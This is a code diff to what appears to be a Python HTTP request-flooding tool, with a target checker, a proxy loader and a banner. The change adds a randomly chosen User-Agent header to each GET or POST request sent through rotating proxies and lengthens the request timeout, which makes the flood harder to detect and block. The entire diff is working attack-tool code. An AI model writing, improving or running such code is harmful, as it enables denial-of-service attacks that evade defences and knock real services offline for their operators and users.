@@ -9,6 +9,7 @@ import random
 
 from proxy import get_proxies
 from banner import logo
+from uagents import get_random_uagent
 
 init(autoreset=True)
 
@@ -38,11 +39,12 @@ def check_target(target_url, proxies):
 
 def send_request(i, target_url, proxy_list):
     try:
+        uagent = get_random_uagent()
         proxy = get_random_proxy(proxy_list)
         if method == "GET":
-            resp = requests.get(target_url, proxies=proxy, timeout=0.2)
+            resp = requests.get(target_url, proxies=proxy, timeout=2, headers={"User-Agent": uagent})
         else:
-            resp = requests.post(target_url, proxies=proxy, timeout=0.2)
+            resp = requests.post(target_url, proxies=proxy, timeout=2, headers={"User-Agent": uagent})
         return resp.status_code
     except Exception as e:
         return str(e)
